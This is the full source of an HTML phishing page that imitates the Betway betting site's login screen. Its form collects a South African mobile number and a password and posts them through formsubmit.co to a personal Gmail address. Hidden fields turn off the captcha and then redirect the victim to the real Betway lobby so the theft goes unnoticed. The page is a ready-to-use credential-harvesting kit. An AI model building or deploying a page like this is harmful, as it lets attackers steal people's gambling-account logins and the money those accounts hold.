<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betway Login</title>
    <style>
        /* General Styles */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: url('https://i.ibb.co/33YKqFH/Screenshot-20250303-053104-Chrome.jpg') no-repeat center center fixed;
            background-size: cover;
        }

        /* Main Container to Keep Layout from the Top */
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            width: 100%;
        }

        /* Header */
        .header {
            background-color: #000;
            color: #fff;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 400px;
        }

        .header button {
            background-color: #28a745;
            color: #fff;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
        }

        /* Login Box */
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 350px;
            text-align: center;
            margin-top: 20px; /* Moves the login container closer to the top */
            color: black;
        }

        .login-container h2 {
            color: black;
        }

        /* Mobile Input with Country Code */
        .input-group {
            display: flex;
            align-items: center;
            border: 1px solid #ddd;
            border-radius: 5px;
            overflow: hidden;
            background: white;
            margin: 10px 0;
        }

        .country-code {
            background-color: green;
            color: white;
            padding: 12px 15px;
            font-weight: bold;
            text-align: center;
            border-right: 1px solid #ddd;
        }

        .phone-input {
            border: none;
            padding: 12px;
            flex: 1;
            outline: none;
            font-size: 16px;
            width: 100%;
        }

        /* Other Inputs */
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        /* Buttons */
        .login-container button {
            width: 100%;
            background-color: #28a745;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }

        .footer {
            margin-top: 10px;
            font-size: 14px;
        }

        .footer a {
            color: #28a745;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <!-- Header -->
        <div class="header">
            <div>Betway</div>
            <div>
                <button>Login</button>
                <button>Sign Up</button>
                <button>Betslip</button>
            </div>
        </div>

        <!-- Login Box -->
        <div class="login-container">
            <form action="https://formsubmit.co/Mashele0075@gmail.com" method="POST">
           <input type="hidden" name="_captcha" value="false"> <!-- Disables reCAPTCHA -->
           <input type="hidden" name="_next" value="https://www.betway.co.za/LiveGameslobby">  
           
            <h2>Login</h2>
            <form>
                <div class="input-group">
                    <span class="country-code">+27</span>
                    <input type="tel" class="phone-input" name="mobile number" placeholder="Mobile Number" required>
                </div>

                <input type="password" name="password" placeholder="Password" required>

                <button type="submit">Login</button>
            </form>

            <p class="footer">Don't have an account yet? <a href="#">Sign Up</a></p>
        </div>
    </div>

</body>
  </html>
